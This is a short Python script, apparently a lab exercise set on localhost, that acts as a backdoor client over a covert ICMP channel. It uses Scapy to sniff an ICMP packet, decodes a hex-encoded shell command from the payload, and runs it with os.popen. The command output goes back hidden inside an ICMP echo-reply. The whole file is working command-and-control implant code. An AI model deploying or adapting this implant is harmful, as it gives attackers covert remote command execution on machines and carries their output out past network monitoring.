#!/usr/bin/env python3

# Client should be on the host machine

from scapy.all import *
import binascii

server = "127.0.0.1"

def send_cmd(cmd):
	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_cmd
	send(packet)
	print("done")

recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
print(recv)
data = recv[0][Raw].load.decode('utf-8')
cmd = binascii.unhexlify(data).decode("utf8")
out = os.popen(cmd).read()

send_cmd(out)